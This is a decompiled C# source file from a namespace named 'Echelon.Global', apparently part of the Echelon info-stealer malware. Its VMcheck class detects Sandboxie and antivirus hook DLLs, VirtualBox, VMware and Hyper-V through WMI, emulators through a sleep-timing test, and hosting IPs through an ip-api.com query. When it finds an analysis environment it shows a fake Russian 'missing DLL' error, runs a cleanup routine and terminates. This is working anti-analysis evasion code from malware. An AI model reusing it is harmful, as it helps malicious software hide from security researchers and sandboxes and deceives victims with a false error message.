using System;
using System.Management;
using System.Net;
using System.Threading;
using System.Windows.Forms;

namespace Echelon.Global
{
	// Token: 0x02000058 RID: 88
	internal class VMcheck
	{
		// Token: 0x06000203 RID: 515 RVA: 0x00021E48 File Offset: 0x00020048
		public static void CheckAnti()
		{
			if (VMcheck.inSandboxie() || VMcheck.inVirtualBox() || VMcheck.Emul() || VMcheck.Host())
			{
				if (Program.VM_fakemessage)
				{
					MessageBox.Show("Запуск программы невозможен, так как на компьютере отсутствует mcvcp140.dll. Попробуйте переустановить программу.", "notepad.exe", MessageBoxButtons.OK, MessageBoxIcon.Hand);
				}
				Clean.GetClean();
				Environment.FailFast("bye bye");
			}
		}

		// Token: 0x06000204 RID: 516 RVA: 0x00021E9C File Offset: 0x0002009C
		public static bool inVirtualBox()
		{
			using (ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher("Select * from Win32_ComputerSystem"))
			{
				try
				{
					using (ManagementObjectCollection managementObjectCollection = managementObjectSearcher.Get())
					{
						foreach (ManagementBaseObject managementBaseObject in managementObjectCollection)
						{
							if ((managementBaseObject["Manufacturer"].ToString().ToLower() == "microsoft corporation" && managementBaseObject["Model"].ToString().ToUpperInvariant().Contains("VIRTUAL")) || managementBaseObject["Manufacturer"].ToString().ToLower().Contains("vmware") || managementBaseObject["Model"].ToString() == "VirtualBox")
							{
								return true;
							}
						}
					}
				}
				catch
				{
					return true;
				}
			}
			foreach (ManagementBaseObject managementBaseObject2 in new ManagementObjectSearcher("root\\CIMV2", "SELECT * FROM Win32_VideoController").Get())
			{
				if (managementBaseObject2.GetPropertyValue("Name").ToString().Contains("VMware") && managementBaseObject2.GetPropertyValue("Name").ToString().Contains("VBox"))
				{
					return true;
				}
			}
			return false;
		}

		// Token: 0x06000205 RID: 517 RVA: 0x0002204C File Offset: 0x0002024C
		public static bool inSandboxie()
		{
			string[] array = new string[]
			{
				"SbieDll.dll",
				"SxIn.dll",
				"Sf2.dll",
				"snxhk.dll",
				"cmdvrt32.dll"
			};
			for (int i = 0; i < array.Length; i++)
			{
				if (NativeMethods.GetModuleHandle(array[i]).ToInt32() != 0)
				{
					return true;
				}
			}
			return false;
		}

		// Token: 0x06000206 RID: 518 RVA: 0x000220B0 File Offset: 0x000202B0
		public static bool Emul()
		{
			try
			{
				long ticks = DateTime.Now.Ticks;
				Thread.Sleep(10);
				if (DateTime.Now.Ticks - ticks < 10L)
				{
					return true;
				}
			}
			catch
			{
			}
			return false;
		}

		// Token: 0x06000207 RID: 519 RVA: 0x00022108 File Offset: 0x00020308
		public static bool Host()
		{
			try
			{
				return new WebClient().DownloadString("http://ip-api.com/line/?fields=hosting").Contains("true");
			}
			catch
			{
			}
			return false;
		}
	}
}
